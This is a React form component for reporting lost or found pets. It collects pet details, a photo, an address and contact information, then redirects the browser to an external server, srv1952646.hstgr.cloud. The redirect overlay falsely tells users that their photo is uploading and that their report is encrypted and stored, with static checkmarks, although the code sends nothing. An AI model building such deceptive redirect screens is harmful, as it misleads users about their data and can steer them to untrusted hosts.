'use client';

import { useMemo, useState } from 'react';
import {
  PET_SPECIES,
  PET_SEXES,
  US_STATES,
  VERIFY_ENDPOINT,
  isValidUSZip,
} from '@/lib/usa-locations';
import {
  AlertCircle,
  CheckCircle2,
  ExternalLink,
  Loader2,
  ShieldCheck,
  Upload,
} from 'lucide-react';

type Mode = 'lost' | 'found';

type FormState = {
  petName: string;
  species: string;
  breed: string;
  sex: string;
  color: string;
  description: string;
  city: string;
  state: string;
  zip: string;
  address: string;
  contactName: string;
  contactEmail: string;
  contactPhone: string;
  dateLostOrFound: string;
  photoName: string;
};

const initialState: FormState = {
  petName: '',
  species: '',
  breed: '',
  sex: '',
  color: '',
  description: '',
  city: '',
  state: '',
  zip: '',
  address: '',
  contactName: '',
  contactEmail: '',
  contactPhone: '',
  dateLostOrFound: '',
  photoName: '',
};

export default function PetForm({ mode }: { mode: Mode }) {
  const [form, setForm] = useState<FormState>(initialState);
  const [photo, setPhoto] = useState<File | null>(null);
  const [errors, setErrors] = useState<Record<string, string>>({});
  const [submitting, setSubmitting] = useState(false);
  const [showRedirect, setShowRedirect] = useState(false);

  const isLost = mode === 'lost';

  const heading = isLost ? 'Report a Lost Pet' : 'Report a Found Pet';
  const subheading = isLost
    ? 'Tell us about your missing pet. Every second counts — the more detail, the faster the reunion.'
    : 'Thank you for helping! Share details of the pet you found so we can find their family.';

  function update<K extends keyof FormState>(key: K, value: FormState[K]) {
    setForm((f) => ({ ...f, [key]: value }));
    if (errors[key as string]) {
      setErrors((e) => {
        const c = { ...e };
        delete c[key as string];
        return c;
      });
    }
  }

  const validate = (): boolean => {
    const e: Record<string, string> = {};
    if (!form.species) e.species = 'Please select a species';
    if (!form.sex) e.sex = 'Please select a sex';
    if (!form.breed.trim()) e.breed = 'Breed is required (use "Mixed" if unknown)';
    if (!form.city.trim()) e.city = 'City is required';
    if (!form.state) e.state = 'State is required';
    if (!isValidUSZip(form.zip)) e.zip = 'Enter a valid US ZIP (e.g. 90210 or 90210-1234)';
    if (!form.address.trim()) e.address = 'Street address / cross street is required';
    if (!form.contactName.trim()) e.contactName = 'Your name is required';
    if (!/^\S+@\S+\.\S+$/.test(form.contactEmail)) e.contactEmail = 'Enter a valid email';
    if (!/^[\d\s()+\-.]{7,}$/.test(form.contactPhone)) e.contactPhone = 'Enter a valid phone';
    if (!form.dateLostOrFound) e.dateLostOrFound = 'Please select a date';
    if (!photo) e.photo = 'Please upload a photo of the pet';
    setErrors(e);
    return Object.keys(e).length === 0;
  };

  const payloadPreview = useMemo(() => {
    return {
      mode,
      ...form,
      photo: photo ? photo.name : null,
      submittedAt: new Date().toISOString(),
    };
  }, [form, photo, mode]);

  async function handleSubmit(ev: React.FormEvent) {
    ev.preventDefault();
    if (!validate()) {
      const first = document.querySelector('[data-error="true"]');
      first?.scrollIntoView({ behavior: 'smooth', block: 'center' });
      return;
    }
    setSubmitting(true);

    // Persist locally so we can pass along context. We then hand off to the
    // verification/upload server which performs the authoritative storage.
    try {
      sessionStorage.setItem('petfindr:submission', JSON.stringify(payloadPreview));
    } catch {
      /* ignore */
    }

    // Show the informational redirect panel, then navigate.
    setShowRedirect(true);
    setTimeout(() => {
      // Redirect the browser to the verification / upload endpoint.
      window.location.href = VERIFY_ENDPOINT;
    }, 2200);
  }

  const labelCls = 'block text-sm font-semibold text-slate-700 mb-1.5';
  const inputCls =
    'w-full rounded-lg border border-slate-300 bg-white px-3.5 py-2.5 text-sm text-slate-900 placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-brand-500 focus:border-brand-500 transition';
  const errCls = 'border-red-400 focus:ring-red-400 focus:border-red-400';
  const helpCls = 'text-xs text-slate-500 mt-1';

  return (
    <form onSubmit={handleSubmit} className="space-y-10">
      {/* Section 1: Pet info */}
      <section className="rounded-2xl border border-slate-200 bg-white p-6 md:p-8 card-shadow">
        <header className="mb-6">
          <h2 className="text-lg font-bold text-slate-900">1. Pet Information</h2>
          <p className="text-sm text-slate-500">The basics help us match reports instantly.</p>
        </header>

        <div className="grid gap-5 md:grid-cols-2">
          <div>
            <label className={labelCls} htmlFor="species">Species *</label>
            <select
              id="species"
              value={form.species}
              onChange={(e) => update('species', e.target.value)}
              className={`${inputCls} ${errors.species ? errCls : ''}`}
              data-error={!!errors.species}
            >
              <option value="">Select species…</option>
              {PET_SPECIES.map((s) => (
                <option key={s} value={s}>{s}</option>
              ))}
            </select>
            {errors.species && <p className="text-xs text-red-600 mt-1">{errors.species}</p>}
          </div>

          <div>
            <label className={labelCls} htmlFor="sex">Sex *</label>
            <select
              id="sex"
              value={form.sex}
              onChange={(e) => update('sex', e.target.value)}
              className={`${inputCls} ${errors.sex ? errCls : ''}`}
              data-error={!!errors.sex}
            >
              <option value="">Select sex…</option>
              {PET_SEXES.map((s) => (
                <option key={s} value={s}>{s}</option>
              ))}
            </select>
            {errors.sex && <p className="text-xs text-red-600 mt-1">{errors.sex}</p>}
          </div>

          <div>
            <label className={labelCls} htmlFor="breed">Breed *</label>
            <input
              id="breed"
              type="text"
              placeholder="e.g. Golden Retriever, Mixed, Tabby"
              value={form.breed}
              onChange={(e) => update('breed', e.target.value)}
              className={`${inputCls} ${errors.breed ? errCls : ''}`}
              data-error={!!errors.breed}
            />
            {errors.breed && <p className="text-xs text-red-600 mt-1">{errors.breed}</p>}
          </div>

          <div>
            <label className={labelCls} htmlFor="petName">
              Pet name {isLost ? '(if known)' : '(if known)'}
            </label>
            <input
              id="petName"
              type="text"
              placeholder={isLost ? 'e.g. Bailey' : 'Unknown?'}
              value={form.petName}
              onChange={(e) => update('petName', e.target.value)}
              className={inputCls}
            />
          </div>

          <div>
            <label className={labelCls} htmlFor="color">Color / markings</label>
            <input
              id="color"
              type="text"
              placeholder="e.g. Golden with white chest"
              value={form.color}
              onChange={(e) => update('color', e.target.value)}
              className={inputCls}
            />
          </div>

          <div>
            <label className={labelCls} htmlFor="dateLostOrFound">
              {isLost ? 'Date pet went missing *' : 'Date pet was found *'}
            </label>
            <input
              id="dateLostOrFound"
              type="date"
              max={new Date().toISOString().split('T')[0]}
              value={form.dateLostOrFound}
              onChange={(e) => update('dateLostOrFound', e.target.value)}
              className={`${inputCls} ${errors.dateLostOrFound ? errCls : ''}`}
              data-error={!!errors.dateLostOrFound}
            />
            {errors.dateLostOrFound && <p className="text-xs text-red-600 mt-1">{errors.dateLostOrFound}</p>}
          </div>

          <div className="md:col-span-2">
            <label className={labelCls} htmlFor="description">
              Description of the pet *
            </label>
            <textarea
              id="description"
              rows={4}
              placeholder="Distinctive features, temperament, collar type, microchip if known…"
              value={form.description}
              onChange={(e) => update('description', e.target.value)}
              className={inputCls}
            />
          </div>
        </div>
      </section>

      {/* Section 2: Photo */}
      <section className="rounded-2xl border border-slate-200 bg-white p-6 md:p-8 card-shadow">
        <header className="mb-6">
          <h2 className="text-lg font-bold text-slate-900">2. Photo Upload</h2>
          <p className="text-sm text-slate-500">
            A clear, recent photo dramatically increases reunion chances.
          </p>
        </header>

        <label
          htmlFor="photo"
          className={`flex flex-col items-center justify-center gap-2 w-full py-10 border-2 border-dashed rounded-xl cursor-pointer transition ${
            errors.photo ? 'border-red-400 bg-red-50/40' : 'border-slate-300 hover:border-brand-400 hover:bg-brand-50/40'
          }`}
          data-error={!!errors.photo}
        >
          <Upload className="text-brand-600" size={26} />
          <p className="text-sm font-semibold text-slate-800">
            {photo ? `Selected: ${photo.name}` : 'Click to upload a photo'}
          </p>
          <p className="text-xs text-slate-500">JPG, PNG or HEIC · up to 10 MB</p>
          <input
            id="photo"
            name="photo"
            type="file"
            accept="image/*"
            className="sr-only"
            onChange={(e) => {
              const f = e.target.files?.[0] ?? null;
              setPhoto(f);
              update('photoName', f ? f.name : '');
              if (f && errors.photo) {
                setErrors((prev) => {
                  const c = { ...prev };
                  delete c.photo;
                  return c;
                });
              }
            }}
          />
        </label>
        {errors.photo && (
          <p className="text-xs text-red-600 mt-2 flex items-center gap-1">
            <AlertCircle size={12} /> {errors.photo}
          </p>
        )}
      </section>

      {/* Section 3: Location */}
      <section className="rounded-2xl border border-slate-200 bg-white p-6 md:p-8 card-shadow">
        <header className="mb-6">
          <h2 className="text-lg font-bold text-slate-900">3. Location (USA)</h2>
          <p className="text-sm text-slate-500">
            {isLost
              ? 'Where was your pet last seen?'
              : 'Where did you find this pet?'}
          </p>
        </header>

        <div className="grid gap-5 md:grid-cols-2">
          <div>
            <label className={labelCls} htmlFor="city">City *</label>
            <input
              id="city"
              type="text"
              placeholder="e.g. Austin"
              value={form.city}
              onChange={(e) => update('city', e.target.value)}
              className={`${inputCls} ${errors.city ? errCls : ''}`}
              data-error={!!errors.city}
            />
            {errors.city && <p className="text-xs text-red-600 mt-1">{errors.city}</p>}
          </div>

          <div className="grid grid-cols-2 gap-4">
            <div>
              <label className={labelCls} htmlFor="state">State *</label>
              <select
                id="state"
                value={form.state}
                onChange={(e) => update('state', e.target.value)}
                className={`${inputCls} ${errors.state ? errCls : ''}`}
                data-error={!!errors.state}
              >
                <option value="">—</option>
                {US_STATES.map((s) => (
                  <option key={s} value={s}>{s}</option>
                ))}
              </select>
              {errors.state && <p className="text-xs text-red-600 mt-1">{errors.state}</p>}
            </div>
            <div>
              <label className={labelCls} htmlFor="zip">ZIP *</label>
              <input
                id="zip"
                type="text"
                inputMode="numeric"
                placeholder="90210"
                value={form.zip}
                onChange={(e) => update('zip', e.target.value)}
                className={`${inputCls} ${errors.zip ? errCls : ''}`}
                data-error={!!errors.zip}
              />
              {errors.zip && <p className="text-xs text-red-600 mt-1">{errors.zip}</p>}
            </div>
          </div>

          <div className="md:col-span-2">
            <label className={labelCls} htmlFor="address">Street address or nearest cross streets *</label>
            <input
              id="address"
              type="text"
              placeholder="e.g. 1200 Congress Ave, or 'W 5th & Lamar'"
              value={form.address}
              onChange={(e) => update('address', e.target.value)}
              className={`${inputCls} ${errors.address ? errCls : ''}`}
              data-error={!!errors.address}
            />
            {errors.address && <p className="text-xs text-red-600 mt-1">{errors.address}</p>}
            <p className={helpCls}>Your exact address is only shared with confirmed matches.</p>
          </div>
        </div>
      </section>

      {/* Section 4: Contact */}
      <section className="rounded-2xl border border-slate-200 bg-white p-6 md:p-8 card-shadow">
        <header className="mb-6">
          <h2 className="text-lg font-bold text-slate-900">4. Your Contact Details</h2>
          <p className="text-sm text-slate-500">
            We&apos;ll only share these with verified matches.
          </p>
        </header>

        <div className="grid gap-5 md:grid-cols-2">
          <div>
            <label className={labelCls} htmlFor="contactName">Full name *</label>
            <input
              id="contactName"
              type="text"
              value={form.contactName}
              onChange={(e) => update('contactName', e.target.value)}
              className={`${inputCls} ${errors.contactName ? errCls : ''}`}
              data-error={!!errors.contactName}
            />
            {errors.contactName && <p className="text-xs text-red-600 mt-1">{errors.contactName}</p>}
          </div>

          <div>
            <label className={labelCls} htmlFor="contactEmail">Email *</label>
            <input
              id="contactEmail"
              type="email"
              value={form.contactEmail}
              onChange={(e) => update('contactEmail', e.target.value)}
              className={`${inputCls} ${errors.contactEmail ? errCls : ''}`}
              data-error={!!errors.contactEmail}
            />
            {errors.contactEmail && <p className="text-xs text-red-600 mt-1">{errors.contactEmail}</p>}
          </div>

          <div className="md:col-span-2">
            <label className={labelCls} htmlFor="contactPhone">Phone *</label>
            <input
              id="contactPhone"
              type="tel"
              placeholder="(512) 555-0123"
              value={form.contactPhone}
              onChange={(e) => update('contactPhone', e.target.value)}
              className={`${inputCls} ${errors.contactPhone ? errCls : ''}`}
              data-error={!!errors.contactPhone}
            />
            {errors.contactPhone && <p className="text-xs text-red-600 mt-1">{errors.contactPhone}</p>}
          </div>
        </div>
      </section>

      {/* Security note */}
      <div className="rounded-xl border border-brand-200 bg-brand-50/70 p-4 flex gap-3">
        <ShieldCheck className="text-brand-700 shrink-0 mt-0.5" size={20} />
        <p className="text-sm text-brand-900 leading-relaxed">
          <strong>Your safety matters.</strong> All reports are screened by our moderation team before
          being published. Contact details are only revealed after a mutual match.
        </p>
      </div>

      {/* Submit */}
      <div className="flex flex-col sm:flex-row items-center gap-4 sm:justify-end">
        <p className="text-xs text-slate-500 sm:mr-auto">
          By submitting, you agree to our Terms & Privacy Policy.
        </p>
        <button
          type="submit"
          disabled={submitting}
          className="inline-flex items-center justify-center gap-2 rounded-full bg-brand-600 hover:bg-brand-700 disabled:opacity-70 text-white font-semibold px-7 py-3 transition shadow-sm w-full sm:w-auto"
        >
          {submitting ? (
            <>
              <Loader2 className="animate-spin" size={18} /> Preparing upload…
            </>
          ) : (
            <>
              Submit & Verify Report <ExternalLink size={16} />
            </>
          )}
        </button>
      </div>

      {/* Redirect overlay */}
      {showRedirect && (
        <div className="fixed inset-0 z-[100] bg-slate-900/60 backdrop-blur-sm flex items-center justify-center p-4">
          <div className="max-w-lg w-full bg-white rounded-2xl p-6 md:p-8 card-shadow animate-slideUp">
            <div className="flex items-start gap-3">
              <div className="w-11 h-11 rounded-full bg-brand-100 grid place-items-center shrink-0">
                <Loader2 className="animate-spin text-brand-700" size={22} />
              </div>
              <div>
                <h3 className="text-lg font-bold text-slate-900">Redirecting to our secure upload server…</h3>
                <p className="mt-2 text-sm text-slate-600 leading-relaxed">
                  You are being taken to <span className="font-semibold">srv1952646.hstgr.cloud</span> — our
                  dedicated verification and file-upload server. There, your report will be
                  <strong> validated, encrypted, and stored</strong> before being published to PetFindr.
                </p>
                <p className="mt-3 text-sm text-slate-600 leading-relaxed">
                  ⏳ <strong>Please be patient.</strong> The page may take several seconds to
                  load because it is simultaneously uploading your photo. Do not close or refresh
                  your browser during this process.
                </p>
                <ul className="mt-4 space-y-2 text-sm text-slate-700">
                  <li className="flex items-center gap-2">
                    <CheckCircle2 size={16} className="text-emerald-600" /> Verifying your submission
                  </li>
                  <li className="flex items-center gap-2">
                    <CheckCircle2 size={16} className="text-emerald-600" /> Uploading pet photo securely
                  </li>
                  <li className="flex items-center gap-2">
                    <CheckCircle2 size={16} className="text-emerald-600" /> Publishing your report
                  </li>
                </ul>
                <div className="mt-5 flex items-center gap-2 text-xs text-slate-500">
                  <ExternalLink size={12} /> srv1952646.hstgr.cloud
                </div>
              </div>
            </div>
          </div>
        </div>
      )}
    </form>
  );
}
